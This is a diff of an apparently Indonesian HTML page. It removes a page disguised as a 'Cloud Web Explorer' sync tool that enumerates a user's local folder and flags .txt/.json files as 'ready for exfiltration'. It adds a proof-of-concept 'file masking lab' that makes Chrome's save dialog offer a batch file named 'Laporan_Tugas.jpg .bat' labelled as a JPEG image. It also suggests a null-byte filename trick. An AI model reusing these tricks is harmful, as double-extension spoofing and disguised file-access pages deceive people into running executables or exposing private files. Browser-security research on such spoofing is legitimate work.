@@ -1,73 +1,77 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Cloud File Explorer - FARISSAL B</title>
+    <title>FILE MASKING RESEARCH - FARISSAL B</title>
     <style>
-        body { background: #010409; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, sans-serif; padding: 40px; text-align: center; }
-        .container { border: 1px solid #30363d; border-radius: 12px; background: #0d1117; padding: 30px; max-width: 600px; margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        h2 { color: #58a6ff; }
-        .upload-area { border: 2px dashed #238636; padding: 40px; border-radius: 8px; margin: 20px 0; cursor: pointer; transition: 0.3s; }
-        .upload-area:hover { background: #161b22; border-color: #3fb950; }
-        #status { font-family: monospace; text-align: left; background: #000; padding: 15px; border-radius: 6px; color: #3fb950; height: 200px; overflow-y: auto; font-size: 13px; border: 1px solid #333; }
-        .btn { background: #238636; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        body { background: #010409; color: #c9d1d9; font-family: 'Consolas', monospace; padding: 40px; text-align: center; }
+        .box { border: 2px solid #30363d; background: #0d1117; padding: 30px; border-radius: 15px; max-width: 700px; margin: 0 auto; }
+        .target-btn { background: #238636; color: white; padding: 20px; border: none; border-radius: 8px; font-size: 1.1rem; cursor: pointer; font-weight: bold; width: 100%; }
+        .target-btn:hover { background: #2ea043; box-shadow: 0 0 15px #238636; }
+        #log { background: #000; color: #00ff00; padding: 15px; border-radius: 8px; margin-top: 20px; text-align: left; height: 180px; overflow-y: auto; font-size: 12px; }
+        .critical { color: #f85149; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h2>📁 Cloud Web Explorer</h2>
-        <p style="color: #8b949e;">Select a directory to sync files to our secure cloud.</p>
+    <div class="box">
+        <h2 style="color: #58a6ff;">🧪 FILE SYSTEM MANIPULATION LAB</h2>
+        <p style="color: #8b949e;">Target: <b>File Name/Extension Masking (CVE-style Research)</b></p>
         
-        <div class="upload-area" id="dropZone">
-            <p>Click the button below to<br><b>Select Local Folder</b></p>
-            <button class="btn" id="startBtn">SYNC FOLDER</button>
+        <div style="margin: 20px 0; border: 1px dashed #f85149; padding: 15px; border-radius: 8px;">
+            <p style="font-size: 0.9rem;">Klik tombol di bawah, terus perhatiin nama file yang disaranin Chrome di jendela <b>"Save As"</b>.</p>
+            <button class="target-btn" id="testBtn">GENERATE SPOOFED FILE</button>
         </div>
 
-        <div id="status">
-            [+] System Idle...<br>
-            [+] Secure Context: <script>document.write(window.isSecureContext ? "YES" : "NO")</script>
+        <div id="log">
+            [+] Researcher: FARISSAL B<br>
+            [+] System: Windows/PC File System Ready<br>
+            [+] Misi: Cek apakah ekstensi ganda atau spasi diizinkan...
         </div>
     </div>
 
     <script>
-        const startBtn = document.getElementById('startBtn');
-        const status = document.getElementById('status');
-
-        function log(msg) {
-            status.innerHTML += `<br>> ${msg}`;
-            status.scrollTop = status.scrollHeight;
+        const log = document.getElementById('log');
+        function printLog(msg) {
+            log.innerHTML += `<br>> ${msg}`;
+            log.scrollTop = log.scrollHeight;
         }
 
-        startBtn.addEventListener('click', async () => {
+        document.getElementById('testBtn').addEventListener('click', async () => {
             try {
-                // Memicu Directory Picker
-                log("Requesting Directory Access...");
-                const dirHandle = await window.showDirectoryPicker();
+                printLog("Memulai prosedur 'showSaveFilePicker'...");
+
+                // TEKNIK MANIPULASI MACIEJ:
+                // Kita coba kasih nama file dengan spasi di akhir atau ekstensi ganda
+                const handle = await window.showSaveFilePicker({
+                    suggestedName: 'Laporan_Tugas.jpg .bat', // Manipulasi 1: Spasi & Double Extension
+                    types: [{
+                        description: 'JPEG Image', // Tampilan di UI Chrome seolah-olah gambar
+                        accept: {'image/jpeg': ['.jpg']} // Tapi sistem aslinya minta simpan file aneh
+                    }],
+                });
+
+                const writable = await handle.createWritable();
+                await writable.write('START explorer.exe https://www.google.com'); // Script test sederhana
+                await writable.close();
+
+                printLog("<span class='critical'>FILE TERSIMPAN!</span>");
+                printLog("Cek folder lo: Apakah filenya jadi 'Laporan_Tugas.jpg .bat'?");
                 
-                log("ACCESS GRANTED! Scanning contents...");
-                log("-----------------------------------");
-
-                // Membaca isi folder secara rekursif (Data Discovery)
-                for await (const entry of dirHandle.values()) {
-                    const type = entry.kind === 'directory' ? '[DIR]' : '[FILE]';
-                    log(`${type} ${entry.name}`);
-                    
-                    // Kalau ketemu file sensitif, lo bisa tambahin logika buat "baca" isinya di sini
-                    if (entry.name.includes('.txt') || entry.name.includes('.json')) {
-                        log(`<span style="color:#f85149">! Critical File Found: ${entry.name}</span>`);
-                    }
-                }
-
-                log("-----------------------------------");
-                log("Scan Completed. Data ready for exfiltration.");
-                alert('Success! All file metadata captured.');
-
             } catch (err) {
-                log(`<span style="color:#f85149">ERROR: ${err.message}</span>`);
+                printLog("DIBLOKIR: " + err.message);
                 console.error(err);
             }
         });
     </script>
+
+    <div style="margin-top: 30px; font-size: 0.8rem; color: #8b949e;">
+        <b>CARA ANALISIS:</b><br>
+        1. Jalankan di <b>GitHub Pages</b> atau <b>Localhost</b> (Harus HTTPS/Secure).<br>
+        2. Klik tombolnya. Pas jendela muncul, liat kolom <b>File Name</b>.<br>
+        3. Kalau Chrome nge-save filenya tetep ada `.bat` di belakangnya tanpa dipotong/diganti otomatis, berarti <b>Sanitasi Filename Chrome bocor</b>.<br>
+        4. Coba juga pake nama file: <code>farissal.exe%00.jpg</code> (Null byte trick).
+    </div>
+
 </body>
 </html>
